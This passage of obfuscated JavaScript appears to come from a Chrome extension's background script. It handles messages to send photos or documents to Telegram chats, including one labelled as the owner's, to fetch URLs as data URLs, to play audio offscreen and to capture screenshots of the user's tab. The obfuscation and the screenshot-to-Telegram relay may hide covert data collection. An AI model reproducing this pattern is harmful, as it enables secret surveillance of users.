                    _0x5c49b2[_0x16e8e7(0x2c6)](_0x23829b, _0x17765b) && (_0x58a10e = !![]);
                    if (_0x1b0672) {
                        const _0x3aea4d = _0x5c49b2[_0x16e8e7(0x3c4)](_0x23829b, OWNER_TG_CHAT_ID), _0x3d0fe3 = _0x5c49b2[_0x16e8e7(0x347)](_0x3aea4d, _0x11408c);
                        if (_0x3d0fe3) {
                            let _0x421c34 = await _0x5c49b2[_0x16e8e7(0x261)](sendTelegramPhoto, _0x23829b, _0x1b0672, _0x5c49b2[_0x16e8e7(0x327)]);
                            (!_0x421c34 || !_0x421c34['ok']) && (_0x421c34 = await _0x5c49b2[_0x16e8e7(0x3bc)](sendTelegramDocument, _0x23829b, _0x1b0672, _0x5c49b2[_0x16e8e7(0x327)])), _0x421c34 && _0x421c34['ok'] ? _0x29dcfb += -0x17ab + 0x14 * 0x4c + 0x11bc : (_0x4757de[_0x16e8e7(0x3c3)]({
                                'chatId': _0x23829b,
                                'stage': _0x5c49b2[_0x16e8e7(0x2d7)],
                                'description': _0x421c34?.[_0x16e8e7(0x231) + 'n'] || _0x5c49b2[_0x16e8e7(0x28e)]
                            }), _0x5c49b2[_0x16e8e7(0x22f)](_0x23829b, _0x17765b) && !_0x34c691 && (_0x34c691 = _0x421c34?.[_0x16e8e7(0x231) + 'n'] || _0x5c49b2[_0x16e8e7(0x22e)]));
                        }
                    }
                }
                if (_0x17765b)
                    _0x58a10e ? await _0x5c49b2[_0x16e8e7(0x2bc)](setTelegramUiState, _0x5c49b2[_0x16e8e7(0x1ba)], '') : await _0x5c49b2[_0x16e8e7(0x2bc)](setTelegramUiState, _0x5c49b2[_0x16e8e7(0x402)], _0x5c49b2[_0x16e8e7(0x317)](_0x34c691, _0x5c49b2[_0x16e8e7(0x29d)]));
                else
                    !_0x196f1d && await _0x5c49b2[_0x16e8e7(0x394)](setTelegramUiState, _0x5c49b2[_0x16e8e7(0x2a7)], _0x5c49b2[_0x16e8e7(0x3e6)]);
                _0x5c49b2[_0x16e8e7(0x34d)](_0x2c0660, {
                    'ok': _0x5c49b2[_0x16e8e7(0x251)](_0x34aa6b, 0x1 * -0x2687 + -0x1287 + -0x1 * -0x390e),
                    'delivered': _0x34aa6b,
                    'photoDelivered': _0x29dcfb,
                    'failed': _0x4757de,
                    'result': _0x360470?.[_0x16e8e7(0x30d)] || null
                });
            } catch (_0x4dcc69) {
                _0x5c49b2[_0x16e8e7(0x412)](_0x2c0660, {
                    'ok': ![],
                    'description': _0x4dcc69[_0x16e8e7(0x2df)]
                });
            }
        })()), !![];
    if (_0x5c49b2[_0x10c59b(0x1ec)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x3e8)]))
        return ((async () => {
            const _0x2064e5 = _0x10c59b;
            try {
                const _0x3aeb06 = await _0x5c49b2[_0x2064e5(0x18c)](fetch, _0x56a146[_0x2064e5(0x314)]);
                if (!_0x3aeb06['ok']) {
                    _0x5c49b2[_0x2064e5(0x25c)](_0x2c0660, { 'success': ![] });
                    return;
                }
                const _0x36135e = await _0x3aeb06[_0x2064e5(0x1a9)](), _0x563860 = new FileReader();
                _0x563860[_0x2064e5(0x3ea)] = () => {
                    const _0xe639bb = _0x2064e5;
                    _0x5c49b2[_0xe639bb(0x2cd)](_0x2c0660, {
                        'success': !![],
                        'dataUrl': _0x563860[_0xe639bb(0x30d)]
                    });
                }, _0x563860[_0x2064e5(0x264)] = () => _0x2c0660({ 'success': ![] }), _0x563860[_0x2064e5(0x31e) + _0x2064e5(0x3ce)](_0x36135e);
            } catch (_0x417a13) {
                _0x5c49b2[_0x2064e5(0x18c)](_0x2c0660, {
                    'success': ![],
                    'error': _0x417a13[_0x2064e5(0x2df)]
                });
            }
        })()), !![];
    if (_0x5c49b2[_0x10c59b(0x38b)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x35f)]))
        return _0x5c49b2[_0x10c59b(0x22a)](ensureOffscreenDocument)[_0x10c59b(0x413)](_0x1369de => {
            const _0x4c9df8 = _0x10c59b, _0x209bb1 = { 'ULxtH': _0x5c49b2[_0x4c9df8(0x3b1)] };
            _0x1369de && _0x5c49b2[_0x4c9df8(0x311)](setTimeout, () => {
                const _0x418da9 = _0x4c9df8;
                chrome[_0x418da9(0x36f)][_0x418da9(0x2bd) + 'e']({
                    'type': _0x209bb1[_0x418da9(0x254)],
                    'volume': _0x56a146[_0x418da9(0x206)] || -0xb8b + -0x5 * 0x166 + 0x1 * 0x128a
                })[_0x418da9(0x2c4)](() => {
                });
            }, 0xf9e + 0x1f11 + 0x69d * -0x7);
        }), ![];
    if (_0x5c49b2[_0x10c59b(0x3eb)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x19e)]))
        return chrome[_0x10c59b(0x1d3)][_0x10c59b(0x3ff)][_0x10c59b(0x30c)]([_0x5c49b2[_0x10c59b(0x330)]], _0x59cba3 => {
            const _0x23d634 = _0x10c59b, _0x116f03 = { 'Xyeli': _0x5c49b2[_0x23d634(0x19e)] }, _0x5f3a11 = _0x59cba3[_0x23d634(0x3e7) + _0x23d634(0x348)];
            _0x5f3a11 && _0x5c49b2[_0x23d634(0x392)](ensureOffscreenDocument)[_0x23d634(0x413)](_0x3b737b => {
                const _0x4d110a = _0x23d634;
                _0x3b737b && _0x5c49b2[_0x4d110a(0x35e)](setTimeout, () => {
                    const _0x3986e1 = _0x4d110a;
                    chrome[_0x3986e1(0x36f)][_0x3986e1(0x2bd) + 'e']({
                        'type': _0x116f03[_0x3986e1(0x17f)],
                        'audioData': _0x5f3a11
                    })[_0x3986e1(0x2c4)](() => {
                    });
                }, 0x48c + 0xc6b * -0x3 + -0x25 * -0xe5);
            });
        }), ![];
    if (_0x5c49b2[_0x10c59b(0x343)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x1f1)]))
        return _0x5c49b2[_0x10c59b(0x31b)](ensureOffscreenDocument)[_0x10c59b(0x413)](_0x5b15cf => {
            const _0x60021 = _0x10c59b;
            _0x5b15cf && chrome[_0x60021(0x36f)][_0x60021(0x2bd) + 'e']({ 'type': _0x5c49b2[_0x60021(0x1f1)] })[_0x60021(0x2c4)](() => {
            });
        }), ![];
    if (_0x5c49b2[_0x10c59b(0x318)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x26f)]))
        return chrome[_0x10c59b(0x1d3)][_0x10c59b(0x3ff)][_0x10c59b(0x30c)]([_0x5c49b2[_0x10c59b(0x330)]], _0x5b6992 => {
            const _0x3a99e0 = _0x10c59b, _0x29bf10 = {
                    'pFJLD': _0x5c49b2[_0x3a99e0(0x26f)],
                    'XTIrg': function (_0x20dfa2, _0x4f033e, _0x2fc81c) {
                        const _0x5a07eb = _0x3a99e0;
                        return _0x5c49b2[_0x5a07eb(0x3cb)](_0x20dfa2, _0x4f033e, _0x2fc81c);
                    }
                }, _0x2f3a0a = _0x5b6992[_0x3a99e0(0x3e7) + _0x3a99e0(0x348)];
            _0x2f3a0a && _0x5c49b2[_0x3a99e0(0x392)](ensureOffscreenDocument)[_0x3a99e0(0x413)](_0x4724ad => {
                const _0x81abfa = _0x3a99e0, _0x416ce7 = { 'qoaHt': _0x29bf10[_0x81abfa(0x333)] };
                _0x4724ad && _0x29bf10[_0x81abfa(0x3cc)](setTimeout, () => {
                    const _0x1ce5ad = _0x81abfa;
                    chrome[_0x1ce5ad(0x36f)][_0x1ce5ad(0x2bd) + 'e']({
                        'type': _0x416ce7[_0x1ce5ad(0x30a)],
                        'audioData': _0x2f3a0a,
                        'volume': _0x56a146[_0x1ce5ad(0x206)]
                    })[_0x1ce5ad(0x2c4)](() => {
                    });
                }, -0x3aa + -0x17d9 + 0x1be7);
            });
        }), ![];
    if (_0x5c49b2[_0x10c59b(0x2e7)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x3ca)]))
        return _0x5c49b2[_0x10c59b(0x392)](ensureOffscreenDocument)[_0x10c59b(0x413)](_0xa4e86b => {
            const _0x5f1757 = _0x10c59b;
            _0xa4e86b && chrome[_0x5f1757(0x36f)][_0x5f1757(0x2bd) + 'e']({ 'type': _0x5c49b2[_0x5f1757(0x3ca)] })[_0x5f1757(0x2c4)](() => {
            });
        }), ![];
    if (_0x5c49b2[_0x10c59b(0x22f)](_0x56a146[_0x10c59b(0x250)], _0x5c49b2[_0x10c59b(0x3fc)])) {
        const _0x4bfbcc = _0x423790 && _0x423790[_0x10c59b(0x366)] ? _0x423790[_0x10c59b(0x366)]['id'] : null;
        return _0x5c49b2[_0x10c59b(0x218)](captureScreenshot, _0x4bfbcc)[_0x10c59b(0x413)](_0xc3f63b => {
            const _0x2257a4 = _0x10c59b;
            _0x5c49b2[_0x2257a4(0x229)](_0x2c0660, { 'dataUrl': _0xc3f63b });
        }), !![];
    }
    return ![];
});